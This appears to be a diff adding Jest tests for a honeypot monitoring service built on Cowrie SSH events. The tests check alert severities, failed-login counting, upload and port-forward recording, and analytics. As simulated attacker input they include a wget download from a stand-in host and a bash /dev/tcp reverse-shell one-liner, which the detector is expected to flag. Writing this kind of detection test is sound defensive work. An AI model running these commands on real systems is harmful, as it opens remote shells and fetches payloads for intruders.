@@ -200,4 +200,112 @@ describe('Phase 4 honeypot audit fixes', () => {
     expect(t.status).toBe('MONITORING')
     expect(t.aiScore).toBe(0.99)
   })
+
+  describe('Phase 5 guide fixes (docs/COWRIE_COMPLETE_GUIDE.md)', () => {
+    const IP = '198.51.100.60'
+    const cmd = (sessionId, command, extra = {}) =>
+      collector.onCommandReceived({
+        sessionId,
+        sourceIP: IP,
+        command,
+        intent: collector.classifyIntent(command),
+        ...extra,
+      })
+    const alerts = () => mongoose.connection.db.collection('alerts').find().toArray()
+
+    test('H4: the session-open placeholder threat is an intrusion attempt, not brute force', async () => {
+      const s = await open('h4-open', IP)
+      expect((await ThreatLog.findById(s.linkedThreatLog)).attackType).toBe('SSH Intrusion Attempt')
+    })
+
+    test('H4: the AI engine gets failed logins of this session and of the same source recently', async () => {
+      const fail = (n) => Array.from({ length: n }, () => ({ username: 'root', password: 'x', success: false }))
+      for (const id of ['h4-a', 'h4-b', 'h4-c']) {
+        const s = await open(id, IP)
+        await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 1, credentials: fail(1) } })
+      }
+      const other = await open('h4-other-ip', '198.51.100.61')
+      await honeypotService.closeSession(other._id, { telemetry: { durationSeconds: 1, credentials: fail(9) } })
+      const last = await open('h4-d', IP)
+      await honeypotService.closeSession(last._id, { telemetry: { durationSeconds: 1, credentials: fail(2) } })
+      expect(mockPredict.mock.calls.at(-1)[0]).toMatchObject({ failedLogins: 2, recentFailedLogins: 3 })
+    })
+
+    test('M1: a failed command marks the stored command unsuccessful, once, without adding one', async () => {
+      await open('m1-failed', IP)
+      await cmd('m1-failed', 'ls')
+      await cmd('m1-failed', 'cd /tmp; notreal -x')
+      const failed = { sessionId: 'm1-failed', sourceIP: IP, command: 'notreal -x ', eventId: 'f'.repeat(32) }
+      expect(await collector.onCommandFailed(failed)).toBeTruthy()
+      await collector.onCommandFailed(failed) // replayed event: no-op
+      const s = await HoneypotSession.findOne({ sessionId: 'm1-failed' })
+      expect(s.commands.map((c) => [c.command, c.success])).toEqual([
+        ['ls', true],
+        ['cd /tmp; notreal -x', false],
+      ])
+      expect(s.commandCount).toBe(2)
+      expect(await collector.onCommandFailed({ ...failed, sessionId: 'no-such-session' })).toBeNull()
+    })
+
+    test('M2: a download command alerts HIGH; only a real download alerts CRITICAL', async () => {
+      await open('m2-intent', IP)
+      await cmd('m2-intent', 'wget http://x.test/a.sh')
+      let titles = (await alerts()).map((a) => [a.title, a.severity])
+      expect(titles).toEqual([['High-Value: MALWARE_DOWNLOAD', 'HIGH']])
+      await cmd('m2-intent', 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')
+      await collector.onFileDownload({
+        sessionId: 'm2-intent',
+        sourceIP: IP,
+        url: 'http://x.test/a.sh',
+        eventId: 'a'.repeat(32),
+      })
+      titles = (await alerts()).map((a) => [a.title, a.severity])
+      expect(titles).toEqual(
+        expect.arrayContaining([
+          ['High-Value: REVERSE_SHELL', 'CRITICAL'],
+          ['Malware Downloaded in Honeypot', 'CRITICAL'],
+        ])
+      )
+    })
+
+    test('M3: uploads and port-forward attempts are recorded and alerted once', async () => {
+      await open('m3', IP)
+      const sha = 'b'.repeat(64)
+      const up = { sessionId: 'm3', sourceIP: IP, filename: '/tmp/x', sha256: sha, eventId: 'c'.repeat(32) }
+      await collector.onFileUpload(up)
+      await collector.onFileUpload(up)
+      const tunnel = { sessionId: 'm3', sourceIP: IP, dstIP: '203.0.113.9', dstPort: 25, eventId: 'd'.repeat(32) }
+      await collector.onTunnelRequest(tunnel)
+      await collector.onTunnelRequest(tunnel)
+      const s = await HoneypotSession.findOne({ sessionId: 'm3' })
+      expect(s.iocExtracted.hashes).toEqual([sha])
+      expect(s.iocExtracted.ips).toEqual(['203.0.113.9'])
+      expect(s.malwareDownloaded).toEqual(['upload:/tmp/x'])
+      const titles = (await alerts()).map((a) => [a.title, a.severity]).sort()
+      expect(titles).toEqual([
+        ['File Uploaded to Honeypot', 'CRITICAL'],
+        ['Port-Forward Attempt', 'HIGH'],
+      ])
+    })
+
+    test('M8: demo sessions are left out of the analytics KPIs', async () => {
+      await open('demo-abc12345', '198.51.100.70')
+      await open('real-1', '198.51.100.71')
+      const { kpis, intelligence } = await honeypotService.getFullAnalytics()
+      expect(kpis.totalToday).toBe(1)
+      expect(kpis.uniqueIPsToday).toBe(1)
+      expect(intelligence.topAttackers.map((a) => a._id)).toEqual(['198.51.100.71'])
+    })
+
+    test('L5: the node port follows HONEYPOT_SSH_PORT', async () => {
+      process.env.HONEYPOT_SSH_PORT = '22'
+      try {
+        expect((await honeypotService.getNodeStatus())[0].port).toBe(22)
+        process.env.HONEYPOT_SSH_PORT = 'junk'
+        expect((await honeypotService.getNodeStatus())[0].port).toBe(2222)
+      } finally {
+        delete process.env.HONEYPOT_SSH_PORT
+      }
+    })
+  })
 })
